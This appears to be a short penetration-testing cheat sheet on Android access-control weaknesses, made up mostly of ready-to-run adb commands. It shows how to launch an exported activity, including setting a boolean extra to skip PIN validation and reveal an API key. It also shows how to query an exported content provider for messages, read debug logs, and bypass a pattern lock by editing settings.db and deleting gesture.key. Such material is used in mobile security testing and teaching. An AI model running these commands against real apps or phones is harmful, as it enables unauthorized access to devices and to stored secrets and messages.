# Android Access Control

## Activity Exploitation
```xml
<activity android:label="@string/apic_label" android:name="<package_name>.APIKeyActivity">
  <intent-filter>
      <action android:name="<package_name>.action.VIEW_KEY" />
      <category android:name="android.intent-category.DEFAULT" />
  </intent-filter>
</activity>
```
e.g.:  
`adb shell am start <package_name>/.APIKeyActivity`  
or  
`adb shell am start <package_name>/.APIKeyActivity -a <package_name>.action.VIEW_KEY`  
e.g.:  
-> Variable validation case in boolean  
if (getIntent().getBooleanExtra(getString(R.string.vld_pin), false)) {  
`cat /res/values/strings.xml | grep vld_pin`  
`<string name="vld_pin">validate_pin</string>`  
`adb shell am start -n <package_name>/.APIKeyActivity -a <package_name>.action.VIEW_KEY --ez validate_pin true`  

## Content Provider Exploitation 
```xml
<provider android:name="<package_name>.MessagesProvider" android:enabled="true" android:exported="true" android:authorities="<package_name>.provider.messagesprovider" />
```
```shell
$ grep -R "content://" *
MessagesProvider.smali:  const-string v0, "content://<package_name>.provider.messagesprovider/messages"  
```
  
`adb shell content query --uri content://<package_name>.provider.messagesprovider/messages`  

## Android Debug Mode Enabled
-> DEBUG mode is ON(andoid:debuggable="true") in AndroidManifest.xml
```
adb logcat
```
-> If you want, you can use pidcat to have colorful and organized output (https://github.com/JakeWharton/pidcat)
```
pidcat <package_name>
```

## Crack Android Pattern Lock
```
adb shell
cd /data/data/com.android.providers.settings/databases
sqlite3 settings.db
update system set value=0 where name='lock_pattern_autolock';
update system set value=0 where name='lockscreen.lockedoutpermanently';
.quit
```
```
adb shell rm /data/system/gesture.key
```
